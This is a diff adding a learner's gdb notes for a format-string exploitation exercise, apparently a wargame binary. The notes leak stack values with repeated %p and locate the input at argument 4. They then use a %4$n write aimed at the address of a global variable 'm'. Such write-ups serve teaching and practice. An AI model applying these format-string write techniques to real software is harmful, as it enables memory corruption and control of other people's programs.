@@ -1,0 +1,32 @@
+b v
+r
+disas
+b *0x080484da (break after printf)
+c
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p (type a bunch of %p so printf will actually print where it's args are loaded from)
+0x2000xb7fd1ac00xb7ff37d00x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250xa0xb7fde7140x980xb(nil)(nil)(nil)(nil)(nil)(nil)(nil) (try to find relevant variable: mainly, do we find the location of 'm' aka 0x804988c)
+since we didn't find 'm', we will instead try to understand where those pointers come from (the repeating 0x702570250 is most probably the character '%p%p')
+info registers: ebx = 0xb7fd0ff4, esp = 0xbffff500, ebp = 0xbffff718, eax = 0xdd (221) (number of chars printed by printf)
+disas
+we can see that 0x200 (the first value) is put at esp + 4 (0x080484b6 <+18>:    movl   $0x200,0x4(%esp)) and ebp[-0x208] is put at esp (0x080484cc <+40>:    lea    -0x208(%ebp),%eax, 0x080484d2 <+46>:    mov    %eax,(%esp))
+p $ebp - 0x208 -> 0xbffff510 (we are 10 bytes inside the stack here, let's check this position)
+x/40x 0xbffff510 -> we can see a bunch of 0x70257025, so this is probably the string we just input
+p 0x48-0x10 (offset between the first and last presumed char of our input) -> 56, so this is indeed the full string of %p we just input
+
+let's backup (I went to far once again) and check the first %p, maybe we simply can input the actual location of m as the first 4 bytes of our string and just use a %n$n
+1: 0x200
+2: 0xb7fd1ac0
+3: 0xb7ff37d0
+4: 0x70257025 the start of our string is at index 4 (printf counts from 1, not 0)
+let's test this using gdb
+
+d
+b *0x080484cc (break after fgets, so we can temper the values of our string with more ease)
+r
+0000%4$n
+x/40x 0xbffff510
+set {int}0xbffff510 = 0x804988c
+x/40x 0xbffff510
+b *0x080484df
+c
+info registers: eax = 4 (we did it!, this is indeed the size expected since %n is after the 4 bytes of the address of m)
